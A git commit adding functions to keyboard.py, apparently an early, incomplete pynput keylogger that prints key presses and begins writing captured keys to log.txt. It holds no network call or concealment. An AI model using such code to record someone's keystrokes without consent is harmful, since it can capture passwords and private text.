a83e715a9b3e976fe1f9bf5ddb613c8211a911cb
Gonzalo Rivero Baud <riverobaudg@gmail.com>
2022-05-30 14:46:40 -0300

    (keyboard.py) write functions

--- keyboard.py
+++ keyboard.py
@@ -1,5 +1,8 @@
 from pynput.keyboard import Key, Listener
 
+keys = []
+count = 0
+
 
 def on_press(key):
     print("{0} pressed".format(key))
@@ -8,6 +11,16 @@ def on_press(key):
 def on_release(key):
     if key == Key.esc:
         return False
+
+
+def write_key(key):
+    pass
+
+
+def write_file(keys):
+    with open("log.txt", "a") as f:
+        for k in keys:
+            f.write(k)
 
 
 with Listener(on_press=on_press, on_release=on_release) as listener:
